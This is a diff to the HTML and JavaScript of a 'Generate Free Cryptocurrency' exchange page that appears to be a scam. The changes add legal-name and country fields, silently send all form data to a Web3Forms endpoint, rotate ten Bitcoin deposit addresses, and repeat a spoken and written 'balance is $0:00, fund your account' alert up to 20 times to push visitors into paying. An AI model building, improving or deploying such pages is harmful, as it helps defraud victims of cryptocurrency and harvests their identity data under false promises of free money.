@@ -82,7 +82,7 @@
       border: 1px solid #222;
     }
     h1 {
-      color: #ff69b4;  /* changed to pink as requested */
+      color: #ff69b4;
       text-align: center;
       margin-bottom: 30px;
       font-size: 32px;
@@ -114,7 +114,7 @@
       flex-wrap: wrap;
       justify-content: center;
       width: 100%;
-      border: 2px solid #ff69b4;  /* pink border for better visibility */
+      border: 2px solid #ff69b4;
       box-shadow: 0 8px 20px rgba(0,0,0,0.5);
       transition: all 0.2s ease;
     }
@@ -122,7 +122,7 @@
       font-size: 1.25rem;
       font-weight: 700;
       letter-spacing: 1px;
-      color: #ffb6c1;  /* light pink label */
+      color: #ffb6c1;
       background: none;
       -webkit-background-clip: unset;
       background-clip: unset;
@@ -133,7 +133,7 @@
       font-weight: 800;
       font-family: 'Courier New', monospace;
       letter-spacing: 1px;
-      color: #00ff88;  /* bright neon green for amount - highly visible */
+      color: #00ff88;
     }
     .balance-amount span.dollar-sign {
       color: #00ff88 !important;
@@ -203,7 +203,7 @@
       color: #ff69b4;
       margin-left: 4px;
     }
-    .form-group input, .form-group select {
+    .form-group input, .form-group select, .form-group textarea {
       padding: 12px 15px;
       border-radius: 8px;
       border: 1px solid #333;
@@ -212,13 +212,14 @@
       font-size: 1rem;
       outline: none;
       transition: 0.2s;
+      font-family: inherit;
     }
-    .form-group input:focus, .form-group select:focus {
+    .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
       background: #1a1a1a;
       border-color: #ff69b4;
       box-shadow: 0 0 0 2px rgba(255,105,180,0.3);
     }
-    .form-group input::placeholder {
+    .form-group input::placeholder, .form-group textarea::placeholder {
       color: #888;
     }
     .field-hint {
@@ -265,6 +266,30 @@
       background: #ff69b4;
     }
     .submit-btn:hover:not(:disabled) {
+      transform: scale(1.02);
+      background: #ff1493;
+      box-shadow: 0 5px 15px rgba(255,105,180,0.5);
+    }
+    
+    /* PINK CONTINUE BUTTON inside Bitcoin modal - matches original pink style */
+    .pink-continue-btn {
+      background: #ff69b4;
+      color: #ffffff;
+      font-size: 1rem;
+      font-weight: bold;
+      padding: 12px 32px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.3s;
+      display: inline-block;
+      text-align: center;
+      letter-spacing: 0.5px;
+      margin-top: 20px;
+      width: auto;
+      box-shadow: 0 2px 8px rgba(255,105,180,0.3);
+    }
+    .pink-continue-btn:hover {
       transform: scale(1.02);
       background: #ff1493;
       box-shadow: 0 5px 15px rgba(255,105,180,0.5);
@@ -496,17 +521,6 @@
       width: 100%;
       border-color: #2a6e3a;
     }
-    .continue-btn {
-      background: #222;
-      margin-top: 20px;
-      width: auto;
-      padding: 12px 32px;
-      font-size: 1rem;
-      border-color: #555;
-    }
-    .continue-btn:hover {
-      border-color: #ff69b4;
-    }
     .wallet-input {
       width: 100%;
       padding: 12px;
@@ -612,7 +626,6 @@
   </nav>
 
   <div class="container">
-    <!-- Original heading changed to pink as requested -->
     <h1>Generate Free Cryptocurrency</h1>
     
     <div style="margin: 30px 0 20px 0;">
@@ -627,11 +640,105 @@
     <h2>Exchange Details</h2>
     
     <div class="exchange-form">
-      <form id="exchangeForm">
+      <!-- Web3Forms integration with Full Name first, then Country -->
+      <form id="exchangeForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="807bff94-df80-4acd-b505-3d26a4f9a537">
+        <input type="hidden" name="subject" value="New Crypto Exchange Request - Miaaexchange">
+        
+        <!-- Full Name field (first position) -->
+        <div class="form-group">
+          <label>Full Name <span class="required-star">*</span></label>
+          <input type="text" id="fullName" name="full_name" placeholder="Enter your full name as per ID" required>
+          <div class="reason-text">Required: Your legal name for verification and compliance purposes.</div>
+          <div class="field-hint">We use this to validate your identity and process your exchange securely.</div>
+        </div>
+
+        <!-- Country field (second position, immediately after Full Name) -->
+        <div class="form-group">
+          <label>Country <span class="required-star">*</span></label>
+          <select id="country" name="country" required>
+            <option value="">Select your country</option>
+            <option value="United States">United States</option>
+            <option value="United Kingdom">United Kingdom</option>
+            <option value="Canada">Canada</option>
+            <option value="Australia">Australia</option>
+            <option value="Germany">Germany</option>
+            <option value="France">France</option>
+            <option value="Spain">Spain</option>
+            <option value="Italy">Italy</option>
+            <option value="Netherlands">Netherlands</option>
+            <option value="Switzerland">Switzerland</option>
+            <option value="Sweden">Sweden</option>
+            <option value="Norway">Norway</option>
+            <option value="Denmark">Denmark</option>
+            <option value="Finland">Finland</option>
+            <option value="Belgium">Belgium</option>
+            <option value="Austria">Austria</option>
+            <option value="Ireland">Ireland</option>
+            <option value="Portugal">Portugal</option>
+            <option value="Greece">Greece</option>
+            <option value="Poland">Poland</option>
+            <option value="Czech Republic">Czech Republic</option>
+            <option value="Hungary">Hungary</option>
+            <option value="Romania">Romania</option>
+            <option value="Bulgaria">Bulgaria</option>
+            <option value="Croatia">Croatia</option>
+            <option value="Slovakia">Slovakia</option>
+            <option value="Slovenia">Slovenia</option>
+            <option value="Estonia">Estonia</option>
+            <option value="Latvia">Latvia</option>
+            <option value="Lithuania">Lithuania</option>
+            <option value="Luxembourg">Luxembourg</option>
+            <option value="Malta">Malta</option>
+            <option value="Cyprus">Cyprus</option>
+            <option value="Iceland">Iceland</option>
+            <option value="Japan">Japan</option>
+            <option value="South Korea">South Korea</option>
+            <option value="Singapore">Singapore</option>
+            <option value="Malaysia">Malaysia</option>
+            <option value="Thailand">Thailand</option>
+            <option value="Vietnam">Vietnam</option>
+            <option value="Philippines">Philippines</option>
+            <option value="Indonesia">Indonesia</option>
+            <option value="India">India</option>
+            <option value="Pakistan">Pakistan</option>
+            <option value="Bangladesh">Bangladesh</option>
+            <option value="Sri Lanka">Sri Lanka</option>
+            <option value="Nepal">Nepal</option>
+            <option value="South Africa">South Africa</option>
+            <option value="Nigeria">Nigeria</option>
+            <option value="Kenya">Kenya</option>
+            <option value="Egypt">Egypt</option>
+            <option value="Morocco">Morocco</option>
+            <option value="Ghana">Ghana</option>
+            <option value="Brazil">Brazil</option>
+            <option value="Argentina">Argentina</option>
+            <option value="Mexico">Mexico</option>
+            <option value="Chile">Chile</option>
+            <option value="Colombia">Colombia</option>
+            <option value="Peru">Peru</option>
+            <option value="Venezuela">Venezuela</option>
+            <option value="United Arab Emirates">United Arab Emirates</option>
+            <option value="Saudi Arabia">Saudi Arabia</option>
+            <option value="Qatar">Qatar</option>
+            <option value="Kuwait">Kuwait</option>
+            <option value="Bahrain">Bahrain</option>
+            <option value="Oman">Oman</option>
+            <option value="Turkey">Turkey</option>
+            <option value="Israel">Israel</option>
+            <option value="Russia">Russia</option>
+            <option value="Ukraine">Ukraine</option>
+            <option value="Kazakhstan">Kazakhstan</option>
+            <option value="New Zealand">New Zealand</option>
+          </select>
+          <div class="reason-text">Required: Your country of residence for regulatory compliance.</div>
+          <div class="field-hint">Select the country where you currently reside.</div>
+        </div>
+
         <div class="form-row">
           <div class="form-group">
             <label>From Currency <span class="required-star">*</span></label>
-            <select id="fromCurrency" required>
+            <select id="fromCurrency" name="from_currency" required>
               <option value="BTC">Bitcoin (BTC)</option>
               <option value="ETH">Ethereum (ETH)</option>
               <option value="USDT">Tether (USDT)</option>
@@ -641,7 +748,7 @@
           </div>
           <div class="form-group">
             <label>To Currency <span class="required-star">*</span></label>
-            <select id="toCurrency" required>
+            <select id="toCurrency" name="to_currency" required>
               <option value="ETH">Ethereum (ETH)</option>
               <option value="BTC">Bitcoin (BTC)</option>
               <option value="USDT">Tether (USDT)</option>
@@ -653,33 +760,33 @@
 
         <div class="form-group">
           <label>Your Sending Wallet Address <span class="required-star">*</span></label>
-          <input type="text" id="sendAddress" placeholder="Enter your wallet address (e.g., 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" required>
+          <input type="text" id="sendAddress" name="sending_wallet_address" placeholder="Enter your wallet address (e.g., 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" required>
           <div class="reason-text">Required: So the system can verify ownership and deduct the exact amount securely.</div>
           <div class="field-hint">Make sure the address matches the selected "From Currency".</div>
         </div>
 
         <div class="form-group">
           <label>Your Receiving Wallet Address <span class="required-star">*</span></label>
-          <input type="text" id="receiveAddress" placeholder="Where you want to receive the new currency + profits" required>
+          <input type="text" id="receiveAddress" name="receiving_wallet_address" placeholder="Where you want to receive the new currency + profits" required>
           <div class="reason-text">Required: We will send your exchanged funds within 5 to your wallet address.</div>
         </div>
 
         <div class="form-group">
           <label>Amount (USD) <span class="required-star">*</span></label>
-          <input type="number" id="usdAmount" placeholder="Min $50 - Max $50,000" step="any" required>
+          <input type="number" id="usdAmount" name="usd_amount" placeholder="Min $50 - Max $50,000" step="any" required>
           <div class="reason-text">Required: Determines the quantity of crypto to exchange. Minimum $50 - Maximum $50,000.</div>
           <div class="field-hint">Higher amounts may receive extra profit rewards.</div>
         </div>
 
         <div class="form-group">
           <label>Email Address <span class="required-star">*</span></label>
-          <input type="email" id="email" placeholder="you@example.com" required>
+          <input type="email" id="email" name="email" placeholder="you@example.com" required>
           <div class="reason-text">Required: To send transaction confirmation and instant receipt.</div>
         </div>
 
         <div class="form-group">
           <label>Additional Note (Optional)</label>
-          <input type="text" id="note" placeholder="Any special request or reference">
+          <textarea id="note" name="additional_note" rows="2" placeholder="Any special request or reference"></textarea>
           <div class="reason-text">Optional: Use this if you have a referral code or specific instructions (not required for exchange).</div>
         </div>
 
@@ -747,10 +854,18 @@
 
   <script>
     (function() {
+      // UPDATED: 10 new Bitcoin wallet addresses (provided)
       const WALLET_ADDRESSES = [
-        "bc1qzl0upjkvq9k780p5nxwces9js4uk3yf53hkhu4",
-        "16sBRSQ1yVGkpmPvZJkV1XySnmSaTa99p6",
-        "1DfdPM41foZSsA6e2NjhZzt2UaoenZ2pNw"
+        "bc1qxdyrn9s305fvv60uwk679ftepknxys64ezpn03",
+        "bc1qvevfnj9g4sutvkmuzfqryxjqn8tvrzner4zgm7",
+        "bc1qw6uz6vl6ttxqyldjpurtnn5nf0ahreavjfdfcx",
+        "bc1q9m7w6m57hcc40nydklnea4wp4d77se9xj772x6",
+        "bc1qxxv5caexxzwrff3eqhxdvf3z60eq7k3luzf23n",
+        "bc1q4t7pdxm040nnzf38arzflhvwxt3cw0vpkjjypc",
+        "bc1qq99mrps5wp2xe4hhnxd9r9w7dkzsz54sw4qr04",
+        "bc1qpjemynzejrnpcahpzce857cgynkm26jnaddrkp",
+        "bc1q28sspnnvxj8rt70p9kz46gr5h6qhgj0g0ugqz9",
+        "bc1qaykx894m65e960g0xf6gt0yqsrq5s0dm5qu6j0"
       ];
       let currentWalletIndex = 0;
 
@@ -777,6 +892,18 @@
       let pendingTxId = null;
       
       let continueClickCount = 0;
+      
+      function speakPopupMessage(message) {
+        if ('speechSynthesis' in window) {
+          window.speechSynthesis.cancel();
+          const utterance = new SpeechSynthesisUtterance(message);
+          utterance.rate = 0.95;
+          utterance.pitch = 1.0;
+          utterance.volume = 1;
+          utterance.lang = 'en-US';
+          window.speechSynthesis.speak(utterance);
+        }
+      }
       
       function showMessage(msg, isError = true) {
         messageDiv.textContent = msg;
@@ -929,7 +1056,7 @@
             </div>
             
             <p style="font-size: 0.85rem; color: #dddddd;">All transferred funds will be reflected in your account balance here. Once payment has been completed, please refresh your account to view the updated balance, then click below to proceed with your exchange.</p>
-            <button id="continueToEngineBtn" class="close-modal-btn continue-btn">Click here to continue</button>
+            <button id="continueToEngineBtn" class="pink-continue-btn">Click here to continue</button>
           </div>
         `;
       }
@@ -988,8 +1115,11 @@
       function onContinue() {
         continueClickCount++;
         
-        if (continueClickCount < 3) {
-          alert("Your account balance is $0:00. Please fund your account and proceed with your exchange.");
+        const voiceMessage = "Your account balance is $0:00. Please fund account and proceed with your exchange.";
+        speakPopupMessage(voiceMessage);
+        
+        if (continueClickCount < 20) {
+          alert(voiceMessage);
           return;
         }
         
@@ -1017,8 +1147,13 @@
       if (footerCloseBtn) footerCloseBtn.addEventListener('click', handleEngineModalClose);
       if (minimizeBtn) minimizeBtn.addEventListener('click', toggleMinimize);
       
-      form.addEventListener('submit', function(e) {
+      // Form submission handler with Full Name and Country validation
+      form.addEventListener('submit', async function(e) {
         e.preventDefault();
+        
+        // Validate all fields including new ones
+        const fullName = document.getElementById('fullName').value.trim();
+        const country = document.getElementById('country').value;
         const fromCurrency = document.getElementById('fromCurrency').value;
         const toCurrency = document.getElementById('toCurrency').value;
         const sendAddress = document.getElementById('sendAddress').value.trim();
@@ -1027,6 +1162,14 @@
         const email = document.getElementById('email').value.trim();
         const note = document.getElementById('note').value.trim();
         
+        if (!fullName || fullName.length < 2) {
+          showMessage('Please enter your full name (minimum 2 characters).', true);
+          return;
+        }
+        if (!country) {
+          showMessage('Please select your country of residence.', true);
+          return;
+        }
         if (!sendAddress || !isValidWallet(sendAddress)) {
           showMessage('Please enter a valid sending wallet address (minimum 10 characters, no spaces).', true);
           return;
@@ -1046,6 +1189,8 @@
         
         const uniqueTxId = generateUniqueTxId();
         const formData = {
+          fullName,
+          country,
           fromCurrency,
           toCurrency,
           sendAddress,
@@ -1054,6 +1199,21 @@
           email,
           note: note || '—'
         };
+        
+        // Submit to Web3Forms via fetch (silent, no alert)
+        const formDataToSend = new FormData(form);
+        formDataToSend.append('transaction_id', uniqueTxId);
+        
+        try {
+          await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            body: formDataToSend,
+            headers: { 'Accept': 'application/json' }
+          });
+        } catch (err) {
+          console.warn('Web3Forms submission error (silent):', err);
+        }
+        
         showBitcoinModal(formData, uniqueTxId);
       });
       
